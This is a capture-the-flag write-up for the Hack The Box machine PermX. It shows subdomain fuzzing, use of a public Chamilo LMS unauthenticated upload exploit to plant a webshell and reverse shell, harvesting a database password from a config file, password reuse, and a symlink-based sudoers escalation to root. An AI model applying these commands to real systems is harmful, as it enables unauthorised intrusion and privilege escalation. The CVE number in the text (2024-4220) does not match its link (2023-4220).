## Enumeration

Let's start by running a [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan against our target at `10.10.11.23`

![Ports](/assets/images/HTB%20-%20PermX/Ports.png)

We se the famous duo of 22 && 80 here

Port 80 didn't follow redirect to `http://permx.htb` which is indicative of virtual hosting. We'll add this to our /ec/hosts file for local name resolution and proceed to check out the web server

```bash
sudo nano /etc/hosts
```

![etchosts](/assets/images/HTB%20-%20PermX/localdns.png)

Now that we have that in our local DNS file, let's navigate to the web server

![Web Server](/assets/images/HTB%20-%20PermX/Web%20Server.png)

Navigating around the web server I don't initially see anything I can exploit. Since we have some virtual hosting going on I am going to enumeration sub domains

```bash
ffuf -u http://permx.htb -H "Host: FUZZ.permx.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -fc 302,404
```

![LMS](/assets/images/HTB%20-%20PermX/LMS.png)

We've discoverd the subdomain `lms`. We'll add that to our /etc/hosts file and check it out

![Chamilo](/assets/images/HTB%20-%20PermX/Chamilo.png)

Chamilo is obviously an open source LMS. Looking at the bottom of the screen we don't see a version number but we do see who the Administrator is, `Davis Miller`

Try default passwords does not work. Let's curl the request to see if we can get a version number

```bash
curl -I http://lms.permx.htb
```

![Chamilo 1](/assets/images/HTB%20-%20PermX/Chamilo%201.png)

We see a broad version number of `Chamilo 1` Let's search for exploits on Chamilo 1 

![Search](/assets/images/HTB%20-%20PermX/Github%20Exploit%20Chamilo.png)

We see this github repo for an unauthenticated RCE. We're not sure if this will work as we're sure which version it works for but it's worth checking out

![1.1.11](/assets/images/HTB%20-%20PermX/1.11.24.png)

This script exploits [CVE-2024-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220) which appears to be an unrestricted file upload in the big upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` in Chamilo LMS

Basically, the script will send a post request with a file to the upload endpoint `bigUpload.php` without needing to log in

Let's following the github instructions and clone the repo / install dependencies

```bash
git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc
cd chamilo-lms-unauthenticated-big-upload-rce-poc
pip install -r requirements.txt
```

Now as the repo says, scan the target

```bash
python3 main.py -u http://lms.permx.htb -a scan
```

![Confirmed Exploit](/assets/images/HTB%20-%20PermX/Confiremd%20Exploit.png)

Nice, this exploit looks like it will work for our Chamilo version

Now, as the repo says let's create the PHP script in the vulnerable endpoint

```bash
python3 main.py -u http://lms.permx.htb -a webshell
```

Now create and execute a bash reverse shell file 

```bash
python3 main.py -u http://lms.permx.htb -a revshell
```

![RevShell](/assets/images/HTB%20-%20PermX/RevShell.png)

We have our shell! As always lets' upgrade to a fully interactive TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now we have a new shell with more capabilities. But we want more (being able to use our ctrl & alt keys, etc). Let's background the process with `CTRL + Z`

```bash
stty raw -echo;fg
```

This command will adjust the terminal setting & improve input. Now we can use ctrl & alt. However, it could be better

```bash
export TERM=xterm
```

Beautiful, now we can tab auto complete & more

Since we know Chamilo uses a database to store authentication. We should look for that as we're currently only `www-data`

![Password Found](/assets/images/HTB%20-%20PermX/Password%20found.png)

Doing some research while looking around bring me to this `/var/www/chamilo/app/config/configuration.php` and we discover a password of `03F6lY3uXAP2bkW8` for the db user Chamilo

Let's check the /etc/passwd file to see if there's anyone we can try this password against as password reuse is one of the most common attack vectors

![/etc/passwd](/assets/images/HTB%20-%20PermX/mtz%20user.png)

We see a non-standard user here `mtz` let's try to use the password we obtained on this account

![SU Mtz](/assets/images/HTB%20-%20PermX/SU%20Mtz.png)

Nice, password reuse is always a thing after all. Anyway, let's SSH into this box as it will give us the most stable shell

```bash
ssh mtz@10.10.11.23
```

Nothing useful in the users folder. Let's check sudo permissions

```bash
sudo -l
```

![Sudo Permissions](/assets/images/HTB%20-%20PermX/Sudo%20permissions.png)

We're able to run this `/opt/acl.sh` script as sudo. Let's check it out to see what it does

![ACL.SH](/assets/images/HTB%20-%20PermX/acl.sh.png)

This script first checks for three arguments, then checks if the target path is not inside of /home/mtz & if the target path contains ..
The script uses sudo to run the setfacl on the target, effectively modifying the ACL on it

ACL in Linux provide more granular permission that the standard mode. Since we can run this script as sudo we can basically give any file in our home directory any permissions.

We can exploit this using asymbolic link. Creating a symbolic link from a file in our home directory to the `/etc/sudoers` effectively allows us to modify the sudoers file

![Sym Link](/assets/images/HTB%20-%20PermX/Sym%20link.png)

Now let's run the script!

```bash
sudo /opt/acl.sh mtz rwx /home/pwned.txt
```

Now we can add the user mtx to the suders file

```bash
mtz ALL=(ALL) NOPASSWD: ALL
```

Now, we can sudo su root with our password

![Root PermX](/assets/images/HTB%20-%20PermX/Root%20Permx.png)

GG, we've rooted PermX!
